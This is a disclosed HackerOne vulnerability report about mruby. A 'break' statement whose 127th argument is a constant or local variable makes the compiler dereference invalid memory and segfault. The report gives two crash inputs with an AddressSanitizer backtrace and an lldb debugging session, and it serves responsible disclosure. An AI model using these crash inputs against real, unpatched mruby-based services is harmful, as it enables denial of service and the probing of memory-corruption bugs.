# Segmentation fault due to invalid memory access in codegen when using break with the 127th argument a constant

## Report Details
- **Report ID**: 189704
- **URL**: https://hackerone.com/reports/189704
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-12-09T03:40:49.614Z
- **Disclosed**: 2016-12-17T20:48:31.714Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Crash file is:

```
break 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,CRASH
```

This is 126 0's, then a constant. The 0's can be anything valid, and the constant just has to be a constant. Doesn't matter if it is defined or not. 

Causes a segfault with the following backtrace:
```
ASAN:SIGSEGV
=================================================================
==813==ERROR: AddressSanitizer: SEGV on unknown address 0x0000000002ad (pc 0x00000063edfc bp 0x7ffe98e8cfe0 sp 0x7ffe98e8ce20 T0)
    #0 0x63edfb in codegen /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:1221:39
    #1 0x6818e5 in gen_values /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:821:9
    #2 0x643cae in codegen /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:1596:11
    #3 0x64a94d in loop_break /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:2853:5
    #4 0x64a94d in codegen /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:2001
    #5 0x64c8d8 in codegen /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:1239:7
    #6 0x67a4b9 in scope_body /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:720:3
    #7 0x63f3ef in codegen /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:1540:5
    #8 0x63d870 in mrb_generate_code /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:2925:5
    #9 0x5c0b4d in mrb_load_exec /root/mruby-fixes/mrbgems/mruby-compiler/core/parse.y:5723:10
    #10 0x4e437b in main /root/mruby-fixes/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #11 0x7fae55836ec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
    #12 0x43d116 in _start (/root/mruby-fixes/bin/mruby+0x43d116)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /root/mruby-fixes/mrbgems/mruby-compiler/core/codegen.c:1221 codegen
==813==ABORTING

```

Looking through, looks like in `gen_values`, n loops up to 126 (on the constant node), so takes the first if block, val isn't set, so takes the else inside there, but `t->car->cdr` points to a invalid memory address so when `codegen` dereferences `tree`, it segfaults.

```
$ lldb ./mruby/bin/mruby crash.rb
(lldb) target create "./mruby/bin/mruby"
Current executable set to './mruby/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 58614 launched: './mruby/bin/mruby' (x86_64)
Process 58614 stopped
* thread #1: tid = 0x612a08, 0x000000010005c3f1 mruby`codegen(s=0x000000010101cc20, tree=0x000000000000029b, val=0) + 129 at codegen.c:1221, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x2ad)
    frame #0: 0x000000010005c3f1 mruby`codegen(s=0x000000010101cc20, tree=0x000000000000029b, val=0) + 129 at codegen.c:1221
   1218     return;
   1219   }
   1220
-> 1221   if (s->irep && s->filename_index != tree->filename_index) {
   1222     s->irep->filename = mrb_parser_get_filename(s->parser, s->filename_index);
   1223     mrb_debug_info_append_file(s->mrb, s->irep, s->debug_start_pos, s->pc);
   1224     s->debug_start_pos = s->pc;
(lldb) up
frame #1: 0x000000010006581a mruby`gen_values(s=0x000000010101cc20, t=0x00000001010170d4, val=0) + 762 at codegen.c:821
   818          }
   819        }
   820        else {
-> 821          codegen(s, t->car->cdr, NOVAL);
   822          t = t->cdr;
   823          while (t) {
   824            codegen(s, t->car, NOVAL);
(lldb) p *t->car
(mrb_ast_node) $0 = {
  car = 0x000000000000002c
  cdr = 0x000000000000029b
  lineno = 1
  filename_index = 0
}
(lldb) p n
(int) $1 = 126
(lldb) p is_splat
(int) $2 = 0
(lldb) p val
(int) $3 = 0
(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

So this is showing that that 127th argument to break isn't set right. I printed out `t->car` for each `codegen` call, and it shows for the above, we get a the usual start (CFUNC, BEGIN, etc), then NODE_BREAK, followed by 126 NODE_INT's, then the segfault happens (`tree` points to invalid memory). 

I changed the constant to some other values, and found that `t->car` was clearly overflowing for other values, `0.0` (`NODE_FLOAT`), was always a value of `3157552`, rather than `52`. A `NODE_INT` varied, but one value was `-197952842`, not `51`. same with `NODE_STR`, `NODE_DSTR`, `NODE_REGX`, a *non-empty* `NODE_ARRAY`, a `NODE_FCALL`, `NODE_CALL`.... You get the picture. Weirdly only the `NODE_FLOAT` always kept the same value...

I've just found that a NODE_LVAR also crashes, such as this example crash file:

```
crash=1
break 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,crash
```


Haven't got a patch for this one yet, just wanted to file it.

Cheers,

Hugh


## Attachments
No attachments
